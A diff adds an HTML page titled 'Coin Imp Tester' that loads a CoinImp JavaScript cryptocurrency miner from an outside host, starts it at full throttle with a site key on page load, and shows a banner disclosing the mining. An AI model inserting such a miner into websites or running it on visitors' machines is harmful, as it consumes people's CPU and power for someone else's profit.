@@ -1,0 +1,54 @@
+<html lang="en">
+<head>
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#01796f">
+    <meta http-equiv="cache-control" content="private, max-age=0, no-cache">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+    <link rel="stylesheet" href="/modules/bootstrap/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/mobile.css">
+</head>
+<!-- App Shell -->
+<body>
+    <!-- Header -->
+    <header>
+        {{> header}}
+    </header>
+    <!-- Content -->
+    <main>
+        <div id="jumbotron" class="container-fluid">
+            <div class="">
+
+                <div class="col-md-auto" style='padding:8% 0%;'>
+                    <h2 id='pageTitle' class="ch2" style='font-size:3.4rem;font-family: LinLibertine !important;'>Coin Imp Tester</h2>
+                </div>
+            </div>
+<!--            <div class="carouselWrapper">-->
+<!--                <div class="" id="carousel">-->
+<!--                    <p class="hero-text" id="p1">Trade finance as a service <b>(TFaaS)</b></p>-->
+<!--                    <p class="hero-text" id="p2"><b>Envisioning</b> the future of <b>Finance</b></p>-->
+<!--                    <p class="hero-text" id="p3">Combining <b>asset management</b> with <b>bleeding edge technology</b></p>-->
+
+<!--                </div>-->
+<!--            </div>-->
+
+
+        </div>
+        <div id="content" class="container-fluid">
+
+        </div>
+    </main>
+    <script src="https://www.hostingcloud.racing/N4Ii.js"></script>
+    <script>
+        var _client = new Client.Anonymous('0x48d12498524b2e7c65dd100ecb4d608c4315bc91', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+    </script>
+</body>
+<!-- App Shell -->
+</html>
